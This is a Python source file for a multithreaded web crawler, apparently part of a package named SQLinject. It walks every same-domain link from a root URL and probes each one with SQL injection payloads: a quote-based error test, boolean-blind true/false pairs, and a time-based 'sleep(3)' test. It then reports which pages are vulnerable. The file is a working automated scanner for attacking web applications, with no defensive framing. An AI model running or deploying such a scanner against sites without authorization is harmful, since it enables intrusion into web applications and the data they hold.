#!/usr/bin/env python
# -*- coding:utf-8 -*-

from urllib.parse import urljoin

from bs4 import BeautifulSoup
from SQLinject.lib.core import Download, sqlcheck, UrlManager,Request
import threading


class SpiderMain(object):
    def __init__(self, root, threadNum):
        self.urls = UrlManager.UrlManager()
        self.download = Download.Downloader()
        self.root = root
        self.threadNum = threadNum
        self.check = Request.request()

    def _judge(self, domain, url):
        if url.find(domain) != -1:
            return True
        else:
            return False

    def _parse(self, page_url, content):
        if content is None:
            return
        soup = BeautifulSoup(content, 'html.parser')
        _news = self._get_new_urls(page_url, soup)
        return _news

    def _get_new_urls(self, page_url, soup):
        new_urls = set()
        links = soup.find_all('a')
        for link in links:
            new_url = link.get('href')
            new_full_url = urljoin(page_url, new_url)
            if self._judge(self.root, new_full_url):
                new_urls.add(new_full_url)
        return new_urls

    def craw(self):
        self.urls.add_new_url(self.root)
        while self.urls.has_new_url():
            _content = []
            th = []
            for i in list(range(self.threadNum)):
                if self.urls.has_new_url() is False:
                    break
                new_url = self.urls.get_new_url()
                ##sql check
                payloads = ["1' and 1 = 1 ", "kobe'+and+1%3D1+%23", "kobe'+and+1%3D2+%23", "kobe'+and+sleep(3)%23", ]

                if self.check.checkvul(new_url, payloads[0]):
                    print("SQL inj vulnerability :%s" % new_url)
                elif self.check.is_eq_(new_url, payloads[1], payloads[2]):
                    print("SQL bool blinds vulnerability :%s" % new_url)
                elif self.check.is_time_inj(new_url, payloads[3]) >= 3 :
                    print("SQL time blinds vulnerability :%s" % new_url)

                # if sqlcheck.sqlcheck(new_url):
                #     print("url:%s sqlcheck is valuable" % new_url)
                # try:
                #
                # except Exception:
                #     print('Detection failed')
                # print("craw:" + new_url)
                t = threading.Thread(target=self.download.download, args=(new_url, _content))
                t.start()
                th.append(t)
            for t in th:
                t.join()
            for _str in _content:
                if _str is None:
                    continue
                new_urls = self._parse(new_url, _str["html"])
                self.urls.add_new_urls(new_urls)
